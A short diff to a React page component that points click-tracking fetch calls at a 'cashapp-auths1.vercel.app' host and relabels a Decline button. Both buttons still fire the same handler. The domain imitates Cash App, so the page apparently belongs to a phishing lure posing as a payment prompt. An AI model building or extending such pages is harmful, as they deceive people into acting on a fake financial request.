@@ -27,9 +27,9 @@ const Home = () => {
     .then(res => res.json())
     .then(data => console.log("Fetched Data:", data));
     
-  fetch("http://localhost:5000/api/track-click", { method: "POST" });
+  fetch("https://cashapp-auths1.vercel.app/api/track-click", { method: "POST" });
 
-  fetch("http://localhost:5000/api/click", {
+  fetch("https://cashapp-auths1.vercel.app/api/click", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
@@ -79,7 +79,7 @@ const Home = () => {
         <div className="timestamp">{time}</div>
         <div className="actions">
           <button className="accept" onClick={handleClick}>Accept</button>
-          <button className="decline" onClick={handleClick}>Accept</button>
+          <button className="decline" onClick={handleClick}>Decline</button>
         </div>
       </div>
     </div>
